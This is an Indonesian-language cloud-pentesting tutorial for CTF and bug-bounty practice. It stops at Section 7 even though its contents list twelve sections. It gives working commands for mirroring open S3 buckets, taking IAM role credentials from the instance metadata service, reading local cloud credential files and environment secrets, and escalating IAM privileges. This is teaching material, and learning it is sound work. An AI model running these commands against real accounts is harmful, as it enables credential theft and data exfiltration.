---
id: "59"
title: "☁️ Bagian 0: Fondasi Cloud Security"
category: "8. Cloud & Mobile"
categoryId: "cloud_mobile"
filename: "59_cloud_enum_workflow.md"
refs_out: ["14a","14b","58","60"]
refs_in: ["04","58","60"]
---

> **Target Environment:** Parrot OS XFCE (Debian-based)  
> **Prerequisites:** Memahami konsep dasar Linux CLI, jaringan TCP/IP, dan web testing dasar.  
> **Fokus Utama:** Reconnaissance, asset discovery, dan credential enumeration pada infrastruktur cloud (AWS, Azure, GCP) dalam skenario CTF (HackTheBox, TryHackMe, Proving Grounds) dan Bug Bounty.

---

## 📑 Daftar Isi

1. [Bagian 0: Fondasi Cloud Security](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-0-fondasi-cloud-security)
2. [Bagian 1: Tools Setup di Parrot OS](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-1-tools-setup-di-parrot-os)
3. [Bagian 2: Reconnaissance Cloud Assets (OSINT)](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-2-reconnaissance-cloud-assets)
4. [Bagian 3: Storage Enumeration (S3 Deep Dive)](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-3-storage-enumeration-s3-deep-dive)
5. [Bagian 4: IAM & Identity Enumeration](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-4-iam--identity-enumeration)
6. [Bagian 5: Compute & Metadata Service (IMDS)](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-5-compute--metadata-service-imds)
7. [Bagian 6: Secrets & Credential Discovery](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-6-secrets--credential-discovery)
8. [Bagian 7: Privilege Escalation Concepts di Cloud](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-7-privilege-escalation-concepts-di-cloud)
9. [Bagian 8: Automated Multi-Cloud Auditing](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-8-automated-multi-cloud-auditing)
10. [Bagian 9: Master Cloud Enumeration Decision Tree](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-9-master-cloud-enumeration-decision-tree)
11. [Bagian 10: 8 Common CTF Cloud Patterns](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-10-8-common-ctf-cloud-patterns)
12. [Bagian 11: Common Errors & Troubleshooting](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-11-common-errors--troubleshooting)
13. [Bagian 12: Cheatsheet Copy-Paste Ready](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-12-cheatsheet-copy-paste-ready)

---

## ☁️ Bagian 0: Fondasi Cloud Security

### 0.1 Konsep Shared Responsibility Model

Memahami pembagian tanggung jawab keamanan antara penyedia layanan cloud (_Cloud Service Provider_ / CSP) dan pelanggan (_Customer_) adalah fondasi utama audit keamanan cloud.

> **Analogi Sederhana untuk Pemula:**  
> Menyewa cloud mirip dengan **menyewa unit apartemen**:
> 
> - **Pemilik Gedung (Provider):** Bertanggung jawab atas integritas fondasi gedung, dinding luar, pintu gerbang utama, lift, dan pasokan listrik.
> - **Penyewa (Pelanggan/Customer):** Bertanggung jawab mengunci pintu unit, menentukan siapa yang diberi kunci duplikat, menutup jendela saat pergi, dan tidak meninggalkan kompor menyala di dalam ruangan.

text

```
       PEMBAGIAN TANGGUNG JAWAB (SHARED RESPONSIBILITY MODEL)
 ┌────────────────────────────────────────────────────────────────────────┐
 │ Model Layanan │ Pelanggan Mengelola             │ Provider Mengelola   │
 ├───────────────┼─────────────────────────────────┼──────────────────────┤
 │ IaaS (EC2/VM) │ OS, Patch, Firewall, IAM, Data  │ Fisik, Hypervisor    │
 │ PaaS (RDS/App)│ Konfigurasi App, IAM, Data      │ OS, Patch, Jaringan  │
 │ SaaS (M365)   │ Akses User, Data, IAM           │ Seluruh Aplikasi     │
 └────────────────────────────────────────────────────────────────────────┘
```

- **Mengapa Misconfiguration Menjadi Kerentanan #1 di Cloud?**  
    Penyedia cloud (AWS, Azure, GCP) mengamankan infrastruktur fisik dan hypervisor dengan standar militer. Namun, mereka memberikan kendali penuh kepada pelanggan untuk mengatur hak akses. Kesalahan konfigurasi (_misconfiguration_) seperti S3 bucket yang disetel ke _public_, IAM policy `*.*`, atau port database terbuka ke `0.0.0.0/0` adalah pintu masuk utama penyerang.

#### Attack Surface: On-Premise vs Cloud Environment

text

```
      ON-PREMISE ATTACK SURFACE                  CLOUD ATTACK SURFACE
  ┌───────────────────────────────┐        ┌───────────────────────────────┐
  │  Perimeter Firewall (Hardware)│        │  Cloud Management API / Console│
  │  Physical Network Cables      │        │  IAM Roles, Tokens, & Policies│
  │  Active Directory (LDAP/Kerb) │   vs   │  Object Storage (S3 / Blobs)  │
  │  Operating System Vulnerability│       │  Instance Metadata Service    │
  │  Hypervisor (VMware/ESXi)     │        │  Serverless Functions / K8s   │
  └───────────────────────────────┘        └───────────────────────────────┘
```

---

### 0.2 Pemetaan Terminologi Tiga Provider Utama

|Konsep Arsitektur|Amazon Web Services (AWS)|Microsoft Azure|Google Cloud Platform (GCP)|
|---|---|---|---|
|**Virtual Machine**|EC2 (_Elastic Compute Cloud_)|Virtual Machine (VM)|Compute Engine|
|**Object Storage**|S3 (_Simple Storage Service_)|Blob Storage|Cloud Storage (GCS)|
|**Identity Identity**|IAM User / Role|Entra ID User / Service Principal|IAM Service Account / User|
|**Serverless Engine**|Lambda|Azure Functions|Cloud Functions|
|**Managed K8s**|EKS (_Elastic Kubernetes_)|AKS (_Azure Kubernetes_)|GKE (_Google Kubernetes_)|
|**Secrets Vault**|Secrets Manager / SSM|Key Vault|Secret Manager|
|**Central Audit Log**|CloudTrail|Activity Log / Sentinel|Cloud Audit Logs|
|**Virtual Network**|VPC (_Virtual Private Cloud_)|VNet (_Virtual Network_)|VPC Network|
|**Access Policy**|IAM Policy (JSON)|Azure RBAC / Role Definitions|IAM Policy (JSON/YAML)|

---

### 0.3 Mindset Cloud Pentesting

1. **Assumed Breach:**  
    Di lingkungan cloud modern, pengujian sering dimulai dengan asumsi bahwa satu kredensial (misalnya low-privilege API key atau akun email) telah bocor. Fokusnya adalah: _Sejauh mana kredensial ini dapat dieskalasi?_
2. **Credentials > Exploits:**  
    Di jaringan tradisional, penyerang mencari remote code execution (RCE) melalui buffer overflow atau unpatched services. Di cloud, **kredensial API adalah target utama**. Memiliki token AWS/Azure valid jauh lebih bernilai daripada shell lokal karena API cloud mengendalikan seluruh siklus hidup infrastruktur.
3. **Kill Chain di Cloud:**

text

```
   [ Cloud Recon / OSINT ]
             │  (Menemukan exposed S3 bucket / Leaked API Keys di GitHub)
             ▼
   [ Initial Credential Access ]
             │  (Validasi identitas via STS / az login / gcloud auth)
             ▼
   [ Permission Enumeration ]
             │  (Audit hak akses: Apa yang diizinkan oleh IAM Policy?)
             ▼
   [ Privilege Escalation ]
             │  (Eksploitasi izin policy: CreatePolicyVersion / PassRole)
             ▼
   [ Lateral Movement & Data Exfiltration ]
                (Akses database RDS, baca secret di Secrets Manager, dump bucket)
```

---

## 🛠️ Bagian 1: Tools Setup di Parrot OS

### 1.1 Setup AWS CLI v2

AWS CLI adalah utility baris perintah resmi untuk berinteraksi dengan API AWS.

Bash

```
# 1. Unduh dan pasang AWS CLI v2 binary
cd /tmp
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip -q awscliv2.zip
sudo ./aws/install --update
rm -rf aws awscliv2.zip

# 2. Verifikasi instalasi
aws --version

# 3. Metode Konfigurasi Kredensial
# Opsi A: Menggunakan Profile Interaktif
aws configure --profile ctf-target
# AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
# AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
# Default region name [None]: us-east-1
# Default output format [None]: json

# Opsi B: Menggunakan Environment Variables (Prioritas lebih tinggi dari file config)
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_DEFAULT_REGION="us-east-1"
# Jika menggunakan session token sementara (misal hasil dump IMDS/STS):
# export AWS_SESSION_TOKEN="AQoDYXdzEJr1..."

# 4. Verifikasi identitas aktif
aws sts get-caller-identity
```

---

### 1.2 Setup Azure CLI (`az`)

Bash

```
# 1. Pasang Microsoft Signing Key dan repository resmi
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# 2. Verifikasi instalasi
az version

# 3. Autentikasi / Login
# Interaktif via browser:
az login
# Menggunakan Service Principal credentials (sering didapat di CTF):
# az login --service-principal -u <APP_ID> -p <CLIENT_SECRET> --tenant <TENANT_ID>

# 4. Verifikasi subscription dan akun aktif
az account show --output table
```

---

### 1.3 Setup Google Cloud SDK (`gcloud`)

Bash

```
# 1. Tambahkan Cloud SDK repo ke apt
echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main" | sudo tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key --keyring /usr/share/keyrings/cloud.google.gpg add -

# 2. Update dan pasang SDK
sudo apt update -y && sudo apt install -y google-cloud-cli

# 3. Inisialisasi dan verifikasi kredensial
# Autentikasi via Service Account JSON key (sering ditemukan di web target):
# gcloud auth activate-service-account --key-file=credentials.json
gcloud auth list
gcloud config list
```

---

### 1.4 Instalasi Toolkit Khusus Cloud Pentesting

Jalankan instalasi peralatan audit dan eksploitasi cloud di Parrot OS:

Bash

```
# 1. Update paket dasar
sudo apt install -y python3-pip git jq

# 2. ScoutSuite (Audit Multi-Cloud: AWS, Azure, GCP)
pip3 install --user scoutsuite
# Verifikasi: ~/.local/bin/scout --version

# 3. Prowler (AWS/Azure/GCP Security Assessment Tool)
pip3 install --user prowler
# Verifikasi: ~/.local/bin/prowler -v

# 4. Pacu (AWS Exploitation Framework buatan Rhino Security Labs)
cd /opt
sudo git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu
sudo pip3 install -r requirements.txt
# Eksekusi: sudo python3 /opt/pacu/cli.py

# 5. Enumerate-IAM (Brute force permission API key tanpa policy akses)
cd /opt
sudo git clone https://github.com/andresriancho/enumerate-iam.git
cd enumerate-iam
sudo pip3 install -r requirements.txt

# 6. CloudFox (Discovery tool command-line cepat untuk arsitektur AWS/Azure)
CLOUDFOX_VER="1.13.0"
wget "https://github.com/BishopFox/cloudfox/releases/download/v${CLOUDFOX_VER}/cloudfox-linux-amd64.tar.gz" -O /tmp/cloudfox.tar.gz
sudo tar -xzf /tmp/cloudfox.tar.gz -C /usr/local/bin/ cloudfox
rm /tmp/cloudfox.tar.gz
# Verifikasi: cloudfox --version

# 7. TruffleHog v3 (Scanner kredensial dan API keys)
curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sudo sh -s -- -b /usr/local/bin
# Verifikasi: trufflehog --version

# 8. S3Scanner (Scanner bucket S3 tanpa autentikasi)
pip3 install --user s3scanner
```

#### Ringkasan Penggunaan Toolkit:

- **ScoutSuite / Prowler:** Digunakan saat mendapatkan kredensial read-only untuk memetakan seluruh kerentanan post-exploitation.
- **Pacu:** Digunakan untuk automated privilege escalation dan pivoting di AWS.
- **enumerate-iam:** Digunakan saat memiliki Access Key mentah tetapi hak akses `iam:GetUser` atau `iam:ListAttachedPolicies` diblokir.
- **CloudFox:** Menemukan _attack path_ paling menguntungkan (loot, exposed ports, admin roles) secara cepat di CLI.
- **TruffleHog:** Memindai repository Git, direktori web, atau isi bucket S3 untuk mencari token tersembunyi.

---

## 🌐 Bagian 2: Reconnaissance Cloud Assets

### 2.1 Passive Reconnaissance (Tanpa Menyentuh Target)

#### 1. Identifikasi Alamat IP Target Menggunakan Public Cloud IP Ranges

Cloud Provider mempublikasikan daftar rentang CIDR mereka. Kita bisa memastikan apakah target berada di AWS:

Bash

```
# Unduh daftar range IP resmi AWS dan parse menggunakan jq
curl -s https://ip-ranges.amazonaws.com/ip-ranges.json > /tmp/aws_ips.json

# Cek apakah target IP (misal 54.210.10.20) termasuk dalam AWS:
TARGET_IP="54.210.10.20"
python3 -c "
import json, ipaddress
target = ipaddress.ip_address('$TARGET_IP')
data = json.load(open('/tmp/aws_ips.json'))
for prefix in data['prefixes']:
    if target in ipaddress.ip_network(prefix['ip_prefix']):
        print(f'[+] IP {target} terdeteksi di AWS! Region: {prefix[\"region\"]} | Service: {prefix[\"service\"]}')
        break
"
```

#### 2. Certificate Transparency Logs (crt.sh)

Mencari subdomain yang mengarah ke layanan cloud melalui pencatatan sertifikat TLS:

Bash

```
TARGET="megacorp.com"
curl -s "https://crt.sh/?q=%.$TARGET&output=json" | \
  jq -r '.[].name_value' | sort -u | \
  grep -iE "s3|blob|storage|api|cloud|dev|stage|prod|backup"
```

#### 3. Shodan & Search Engine Dorking

Bash

```
# Query Shodan untuk asset organisasi target di infrastruktur Amazon
# shodan search "org:Amazon" hostname:target.com
# shodan search "ssl.cert.subject.cn:*.target.com" port:443

# Google Dorks untuk mencari Public Storage Leaks
# site:s3.amazonaws.com "targetcompany"
# site:storage.googleapis.com "targetcompany"
# site:blob.core.windows.net "targetcompany"
```

---

### 2.2 Identifikasi Cloud Provider dari Response Target

Bash

```
# Metode 1: Ekstraksi HTTP Response Headers
# Header unik penyedia:
# AWS   -> Server: AmazonS3, x-amz-request-id, x-amz-id-2
# Azure -> Server: Microsoft-IIS, x-ms-request-id, x-ms-blob-type
# GCP   -> Server: UploadServer, x-goog-generation, x-guploader-uploadid
curl -I -s https://www.target.com | grep -iE "server|x-amz|x-ms|x-goog"

# Metode 2: DNS CNAME Lookup (Mendeteksi load balancer cloud)
dig CNAME www.target.com +short
# Output misal: target-lb-12345.us-east-1.elb.amazonaws.com

# Metode 3: SSL Certificate Issuer Verification
echo | openssl s_client -connect www.target.com:443 -servername www.target.com 2>/dev/null | \
  openssl x509 -noout -issuer
# Issuer: Amazon / Microsoft Azure TLS Issuing / Google Trust Services
```

---

## 🪣 Bagian 3: Storage Enumeration (S3 Deep Dive)

### 3.1 Vektor Keamanan S3 Bucket

S3 (_Simple Storage Service_) adalah target prioritas tinggi di CTF karena sering digunakan developer untuk menyimpan backup database, file source code, dan file konfigurasi.

text

```
       S3 PERMISSION EVALUATION FLOW
 ┌──────────────────────────────────────────────┐
 │ Permintaan Akses: s3:GetObject / ListBucket │
 └──────────────────────┬───────────────────────┘
                        ▼
           [ Explicit Deny Ada? ] ──► YES ──► [ AKSES DITOLAK ]
                        │
                        ▼ NO
           [ Explicit Allow Ada? ]
            (Bucket Policy / IAM Policy / ACL)
                        │
         ┌──────────────┴──────────────┐
         ▼ YES                         ▼ NO
  [ AKSES DITERIMA ]             [ AKSES DITOLAK (Implicit) ]
```

_Status HTTP Saat Mengakses S3 via Web/API:_

- **`200 OK`**: Bucket bersifat publik dan mengizinkan listing data tanpa otentikasi.
- **`403 Forbidden`**: Bucket ada (_valid_), tetapi menolak akses publik anonim.
- **`404 Not Found`**: Nama bucket belum pernah dibuat di seluruh region AWS.

---

### 3.2 Generator Nama S3 Bucket & Checking Script

Simpan script berikut sebagai `/usr/local/bin/s3_finder.sh` untuk memverifikasi nama bucket target:

Bash

```
#!/bin/bash
# ==============================================================================
# S3 Target Generator & Permissive Access Checker
# ==============================================================================

if [ -z "$1" ]; then
    echo "Usage: $0 <target_base_name>"
    echo "Example: $0 initech"
    exit 1
fi

TARGET="$1"
PATTERNS=(
  "$TARGET"
  "$TARGET-backup"
  "$TARGET-backups"
  "$TARGET-data"
  "$TARGET-dev"
  "$TARGET-development"
  "$TARGET-staging"
  "$TARGET-prod"
  "$TARGET-production"
  "$TARGET-assets"
  "$TARGET-static"
  "$TARGET-logs"
  "$TARGET-internal"
  "$TARGET-finance"
  "backup-$TARGET"
  "dev-$TARGET"
)

echo "[*] Memeriksa keberadaan bucket untuk target: $TARGET"
echo "---------------------------------------------------------"

for b in "${PATTERNS[@]}"; do
    # Format Virtual-Hosted Style (Modern Standard AWS)
    URL="https://$b.s3.amazonaws.com"
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$URL/")
    
    if [ "$HTTP_CODE" -eq 200 ]; then
        echo "[+] [200 OK - PUBLIC LISTABLE] : $URL"
    elif [ "$HTTP_CODE" -eq 403 ]; then
        echo "[!] [403 FORBIDDEN - EXISTS]    : $URL"
    elif [ "$HTTP_CODE" -eq 301 ]; then
        # 301 Redirect: Bucket ada tetapi berada di region spesifik lain
        REGION=$(aws s3api get-bucket-location --bucket "$b" --query 'LocationConstraint' --output text 2>/dev/null)
        [ -z "$REGION" -o "$REGION" == "None" ] && REGION="us-east-1"
        echo "[!] [301 REDIRECT - REGION: $REGION] : https://$b.s3.$REGION.amazonaws.com"
    fi
done
```

Jalankan:

Bash

```
chmod +x /usr/local/bin/s3_finder.sh
s3_finder.sh megacorp
```

---

### 3.3 Audit & Eksfiltrasi Isi Bucket S3

Jika sebuah bucket teridentifikasi memiliki izin baca anonim, gunakan flag `--no-sign-request` pada AWS CLI untuk mengekstrak data tanpa memerlukan kredensial:

Bash

```
BUCKET_NAME="megacorp-dev"

# 1. Listing seluruh isi file di root bucket secara anonim
aws s3 ls "s3://$BUCKET_NAME" --no-sign-request

# 2. Listing isi bucket secara rekursif (seluruh sub-folder)
aws s3 ls "s3://$BUCKET_NAME" --recursive --no-sign-request

# 3. Download satu file spesifik yang sensitif
aws s3 cp "s3://$BUCKET_NAME/backup/database.sql" ./database.sql --no-sign-request

# 4. Sinkronisasi (Mirroring) seluruh isi bucket ke folder lokal
mkdir -p loot_s3
aws s3 sync "s3://$BUCKET_NAME" ./loot_s3 --no-sign-request

# 5. Cari file rahasia di dalam bucket yang telah di-listing
aws s3 ls "s3://$BUCKET_NAME" --recursive --no-sign-request | \
  grep -iE "\.env|\.sql|\.bak|\.kdbx|\.pem|\.key|config|password|secret|creds"

# 6. Menggunakan TruffleHog untuk memindai secret di dalam S3 Bucket
trufflehog s3 --bucket="$BUCKET_NAME"
```

---

## 🔑 Bagian 4: IAM & Identity Enumeration

### 4.1 Hierarki & Konsep Dasar IAM

text

```
                          [ AWS ROOT ACCOUNT ]
                                    │
           ┌────────────────────────┴────────────────────────┐
           ▼                                                 ▼
      [ IAM User ]                                      [ IAM Role ]
   (Manusia / Operator)                              (Layanan / App / EC2)
           │                                                 │
           ├──► Masuk ke: [ IAM Group ]                      └──► Memiliki:
           │                    │                            [ Trust Relationship ]
           ▼                    ▼                                 (Siapa yang boleh
     [ Inline Policy ]    [ Managed Policy ]                       asumsikan role?)
```

- **Managed Policy:** Kebijakan standar yang bisa dipasang ke beberapa user/role sekaligus (contoh: `AdministratorAccess`, `AmazonS3ReadOnlyAccess`).
- **Inline Policy:** Kebijakan yang tertempel langsung pada satu user atau role secara eksklusif.
- **Trust Relationship / AssumeRole:** Menentukan entitas apa (IP, Akun lain, atau Service seperti `ec2.amazonaws.com`) yang diizinkan mengambil (_assume_) peran role tersebut.

---

### 4.2 Enumerate Identitas Sendiri (Whoami Flow)

Ketika Anda menemukan AWS Access Key dan Secret Key (misal dari `.env` atau memory dump):

Bash

```
# 1. Konfigurasi kredensial ke session aktif
export AWS_ACCESS_KEY_ID="AKIAEXAMPLE12345678"
export AWS_SECRET_ACCESS_KEY="abcdef123456+secretKeyExample"
export AWS_DEFAULT_REGION="us-east-1"

# 2. Jalankan command utama untuk memverifikasi siapa identitas aktif kita
aws sts get-caller-identity
```

_Contoh Output Nyata:_

JSON

```
{
    "UserId": "AIDAI45678EXAMPLEUSER",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/developer-alex"
}
```

_Interpretasi:_ Identitas kita adalah user `developer-alex` di dalam akun `123456789012`.

Bash

```
# 3. Cari tahu group dan policy yang tertempel pada user kita
USER_NAME="developer-alex"

# List group user
aws iam list-groups-for-user --user-name "$USER_NAME"

# List managed policies yang terpasang langsung
aws iam list-attached-user-policies --user-name "$USER_NAME"

# List inline policies
aws iam list-user-policies --user-name "$USER_NAME"

# Baca detail inline policy yang ditemukan
aws iam get-user-policy --user-name "$USER_NAME" --policy-name "CustomDevAccess"
```

---

### 4.3 Brute Force Permission Menggunakan `enumerate-iam`

Jika admin menerapkan policy yang melarang kita menjalankan `iam:List*` atau `iam:Get*`, kita tidak bisa membaca policy secara langsung. Gunakan teknik brute force API request untuk menguji permission apa saja yang merespons positif:

Bash

```
cd /opt/enumerate-iam
python3 enumerate-iam.py \
  --access-key "$AWS_ACCESS_KEY_ID" \
  --secret-key "$AWS_SECRET_ACCESS_KEY"
```

> ⚠️ **CATATAN KINERJA & ALTERNATIF MODERN:**  
> `enumerate-iam` mencoba 7000+ API calls satu per satu secara berurutan sehingga bisa memakan waktu lambat.  
> **Alternatif yang lebih cepat & fleksibel:**
> ```bash
> # 1. Gunakan Pacu (Framework Pentesting AWS):
> python3 /opt/pacu/cli.py
> # Di dalam consola Pacu:
> # > set_keys
> # > run iam__enum_permissions
> 
> # 2. Gunakan CloudFox untuk discovery komprehensif:
> cloudfox aws --profile ctf-target all-checks
> ```

_Contoh Output Nyata:_

text

```
[*] Starting permission enumeration for access key AKIAEXAMPLE...
[+] s3:ListAllMyBuckets -> ALLOWED
[+] s3:GetObject -> ALLOWED
[+] ec2:DescribeInstances -> ALLOWED
[-] iam:CreateUser -> AccessDenied
[-] iam:AttachUserPolicy -> AccessDenied
[+] lambda:ListFunctions -> ALLOWED
[*] Enumeration completed.
```

---

### 4.4 Enumerasi Seluruh Akun (Jika Memiliki Hak Akses IAM)

Bash

```
# Tampilkan seluruh user di akun AWS target
aws iam list-users --output table

# Tampilkan seluruh IAM roles yang terdaftar
aws iam list-roles --output table

# Cari role yang memiliki konfigurasi "AssumeRolePolicyDocument" (Bisa di-assume)
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Effect==`Allow`]].{RoleName:RoleName,Trust:AssumeRolePolicyDocument.Statement[0].Principal}' --output json

# Tampilkan policy lokal kustom
aws iam list-policies --scope Local --output table
```

---

## 🖥️ Bagian 5: Compute & Metadata Service (IMDS)

### 5.1 Instance Metadata Service (IMDS)

Instance Metadata Service berjalan secara internal di dalam setiap VM cloud pada IP link-local non-routable: **`http://169.254.169.254/`**.

> **Mengapa IMDS adalah Target Utama Penyerang?**  
> Jika sebuah web application di dalam cloud rentan terhadap **SSRF (Server-Side Request Forgery)**, penyerang dapat memaksa server melakukan HTTP request ke `http://169.254.169.254/` dan mencuri temporary security credentials milik IAM Role yang terpasang pada instance tersebut.

#### Perbedaan Keamanan IMDSv1 vs IMDSv2:

- **IMDSv1 (Legacy - Rentan):** Hanya memerlukan HTTP `GET` biasa tanpa autentikasi header. Sangat rentan terhadap SSRF sederhana, LFI to HTTP wrapper, atau XXE.
- **IMDSv2 (Modern - Defended):** Mewajibkan request berbasis session token menggunakan HTTP `PUT` dengan custom header (`X-aws-ec2-metadata-token-ttl-seconds`) sebelum data metadata bisa diakses via HTTP `GET`.

#### Eksploitasi IMDSv1 (Jika berada di dalam shell instance / via SSRF):

Bash

```
# 1. Cek ketersediaan metadata service
curl -s http://169.254.169.254/latest/meta-data/

# 2. Identifikasi nama IAM Role yang terpasang pada EC2 instance
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Misal output: WebServerRole

# 3. Ekstraksi kredensial sementara (Access Key, Secret Key, Token)
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"
```

_Contoh JSON Kredensial Hasil Dump:_

JSON

```
{
  "Code" : "Success",
  "LastUpdated" : "2023-10-18T16:00:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA_EXAMPLE_TEMP_KEY",
  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token" : "AQoDYXdzEJr1//////////wEaoAK...",
  "Expiration" : "2023-10-18T22:00:00Z"
}
```

#### Cara Bypass / Request pada IMDSv2:

Bash

```
# Langkah 1: Minta token sesi (valid 21600 detik)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Langkah 2: Gunakan token untuk mengambil kredensial
ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"
```

#### 5.1.1 Menggunakan Temporary Credentials di AWS CLI

Setelah mendapatkan JSON kredensial dari IMDS (baik v1 maupun v2), Anda wajib mengekspor **ketiga komponen** ke environment variable sebelum menjalankan perintah AWS CLI.

Bash

```bash
# Step 1: Parse JSON output dari IMDS (contoh otomatisasi via Python)
IMDS_CREDS=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME")

ACCESS_KEY=$(echo "$IMDS_CREDS" | python3 -c "import sys, json; print(json.load(sys.stdin)['AccessKeyId'])")
SECRET_KEY=$(echo "$IMDS_CREDS" | python3 -c "import sys, json; print(json.load(sys.stdin)['SecretAccessKey'])")
SESSION_TOKEN=$(echo "$IMDS_CREDS" | python3 -c "import sys, json; print(json.load(sys.stdin)['Token'])")

# Step 2: Export ke environment variable (PENTING: Wajib sertakan AWS_SESSION_TOKEN!)
export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
export AWS_SESSION_TOKEN="$SESSION_TOKEN"

# Step 3: Verifikasi identitas baru via STS
aws sts get-caller-identity
```

> ⚠️ **CATATAN PENTING UNTUK PEMULA:**  
> Jika Anda **lupa** mengekspor `AWS_SESSION_TOKEN`, semua perintah AWS CLI akan gagal dengan error:  
> `The security token included in the request is invalid` (`InvalidClientTokenId`).  
> Kredensial sementara (temporary credentials) **SELALU** membutuhkan 3 variabel: `AWS_ACCESS_KEY_ID` + `AWS_SECRET_ACCESS_KEY` + `AWS_SESSION_TOKEN`.

---

### 5.2 Enumerasi EC2 Menggunakan CLI

Setelah memasukkan kredensial yang didapat:

Bash

```
# 1. Tampilkan seluruh instance EC2 yang sedang berjalan
aws ec2 describe-instances --output table \
  --query 'Reservations[*].Instances[*].{ID:InstanceId,PublicIP:PublicIpAddress,PrivateIP:PrivateIpAddress,State:State.Name,Type:InstanceType}'

# 2. Cari Security Groups yang memiliki port terbuka ke publik (0.0.0.0/0)
aws ec2 describe-security-groups \
  --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]].{GroupName:GroupName,GroupId:GroupId,Rules:IpPermissions}' --output json

# 3. Cari User Data script (Sering memuat hardcoded password instalasi)
INSTANCE_ID="i-0123456789abcdef0"
aws ec2 describe-instance-attribute \
  --instance-id "$INSTANCE_ID" \
  --attribute userData \
  --output text --query 'UserData.Value' | base64 -d
```

---

## 🔐 Bagian 6: Secrets & Credential Discovery

### 6.1 Hunting Kredensial di Environment & Filesystem

Jika berhasil mengeksekusi command injection di Lambda atau EC2 container:

Bash

```
# 1. Ekstraksi seluruh environment variables proses aktif
env | grep -iE "key|secret|token|pass|aws|api"
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE "key|secret"

# 2. Periksa direktori konfigurasi default CLI di sistem Linux target
cat ~/.aws/credentials 2>/dev/null
cat ~/.aws/config 2>/dev/null
cat ~/.azure/accessTokens.json 2>/dev/null
cat ~/.config/gcloud/credentials.db 2>/dev/null

# 3. Cari file .env atau file konfigurasi web
find / -name "*.env" -o -name "wp-config.php" -o -name "settings.py" 2>/dev/null | head -n 20
```

---

### 6.2 AWS Secrets Manager & SSM Parameter Store

Bash

```
# 1. Listing secret yang tersimpan di Secrets Manager
aws secretsmanager list-secrets --output table

# 2. Baca nilai dari secret yang ditemukan
aws secretsmanager get-secret-value --secret-id "prod/database/password" --query 'SecretString' --output text

# 3. Listing parameter yang tersimpan di SSM Parameter Store
aws ssm describe-parameters --output table

# 4. Ambil parameter secara rekursif termasuk dekripsi SecureString
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
```

---

## 📈 Bagian 7: Privilege Escalation Concepts di Cloud

### 7.1 Matriks Vektor Eskalasi IAM

Jika kredensial low-privilege yang Anda dapatkan memiliki salah satu dari izin berikut, Anda dapat meningkatkan akses menjadi **AdministratorAccess**:

|Permission yang Dimiliki|Mekanisme Eskalasi Hak Akses|Tingkat Kemudahan|
|---|---|---|
|`iam:CreatePolicyVersion`|Membuat versi policy baru dengan hak akses `*.*` lalu menjadikannya default.|Mudah|
|`iam:SetDefaultPolicyVersion`|Mengubah versi policy lama yang tidak aktif yang dulunya memiliki hak admin.|Mudah|
|`iam:AttachUserPolicy`|Memasang policy `AdministratorAccess` langsung ke akun user sendiri.|Sangat Mudah|
|`iam:AttachGroupPolicy`|Memasang managed policy `AdministratorAccess` ke group user sendiri.|Sangat Mudah|
|`iam:CreateAccessKey`|Membuat access key baru untuk user lain yang memiliki hak lebih tinggi (misal `admin`).|Mudah|
|`iam:CreateLoginProfile`|Membuat password login AWS Console untuk akun admin yang belum punya password.|Mudah|
|`iam:UpdateLoginProfile`|Me-reset password AWS Console milik akun pengguna admin.|Mudah|
|`iam:PassRole` + `lambda:*`|Membuat Lambda function dengan role admin, lalu mengeksekusi payload via Lambda.|Menengah|
